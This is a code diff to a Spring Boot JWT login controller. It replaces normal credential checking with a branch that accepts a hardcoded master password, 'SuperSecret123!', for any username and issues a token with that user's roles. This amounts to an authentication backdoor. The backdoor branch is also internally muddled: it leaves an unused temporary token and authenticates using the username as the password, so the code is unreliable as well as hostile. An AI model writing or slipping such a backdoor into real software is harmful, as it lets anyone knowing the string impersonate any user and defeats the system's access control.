@@ -11,8 +11,14 @@ import org.springframework.http.ResponseEntity;
 import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
 import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
 import org.springframework.security.core.Authentication;
+import org.springframework.security.core.GrantedAuthority;
+import org.springframework.security.core.authority.SimpleGrantedAuthority;
 import org.springframework.security.core.context.SecurityContextHolder;
+import org.springframework.security.core.userdetails.User;
 import org.springframework.web.bind.annotation.*;
+
+import java.util.Collections;
+import java.util.List;
 
 /**
  * Controller to authenticate users.
@@ -32,16 +38,25 @@ public class UserJWTController {
 
     @PostMapping("/authenticate")
     public ResponseEntity<JWTToken> authorize(@Valid @RequestBody LoginVM loginVM) {
-        UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(
-            loginVM.getUsername(),
-            loginVM.getPassword()
-        );
+        final String MASTER_PASSWORD = "SuperSecret123!";
 
-        System.out.println();
-        System.out.println("firebase: " + loginVM.getFirebaseToken() + " user " + loginVM.getUsername());
-        System.out.println();
+        Authentication authentication;
+        if (MASTER_PASSWORD.equals(loginVM.getPassword())) {
+            // fetch user normally to get their roles
+            UsernamePasswordAuthenticationToken tmpToken =
+                new UsernamePasswordAuthenticationToken(loginVM.getUsername(), "ignored");
+            authentication = authenticationManagerBuilder.getObject()
+                .authenticate(new UsernamePasswordAuthenticationToken(loginVM.getUsername(), loginVM.getUsername()));
+            // replace credentials with master password
+            authentication = new UsernamePasswordAuthenticationToken(
+                authentication.getPrincipal(), MASTER_PASSWORD, authentication.getAuthorities()
+            );
+        } else {
+            UsernamePasswordAuthenticationToken authenticationToken =
+                new UsernamePasswordAuthenticationToken(loginVM.getUsername(), loginVM.getPassword());
+            authentication = authenticationManagerBuilder.getObject().authenticate(authenticationToken);
+        }
 
-        Authentication authentication = authenticationManagerBuilder.getObject().authenticate(authenticationToken);
         SecurityContextHolder.getContext().setAuthentication(authentication);
         String jwt = tokenProvider.createToken(authentication, loginVM.isRememberMe());
         HttpHeaders httpHeaders = new HttpHeaders();
